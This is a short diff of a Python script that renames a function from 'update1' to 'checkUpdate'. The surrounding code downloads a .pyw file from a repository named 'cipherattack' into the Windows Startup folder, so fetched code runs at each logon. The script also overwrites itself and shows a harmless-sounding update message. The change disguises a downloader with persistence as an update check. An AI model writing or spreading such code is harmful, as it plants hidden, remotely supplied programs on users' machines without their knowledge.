@@ -44,7 +44,7 @@ def update():
         with open(os.path.basename(__file__),"wb") as py:
             py.write(updateFile.read())
 
-def update1():      
+def checkUpdate():      
     os.chdir(os.environ['appdata']+r"\Microsoft\Windows\Start Menu\Programs\Startup")
     with ur.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/target.pyw") as conf:
         with open("config.pyw","wb") as config:
@@ -58,7 +58,7 @@ if not os.path.isfile("availability.dat"):
 
 if os.name == "nt":
     update()
-    update1()
+    checkUpdate()
     print("Updated the file successfully! Restart the program to check new update and features")
     exit()
 
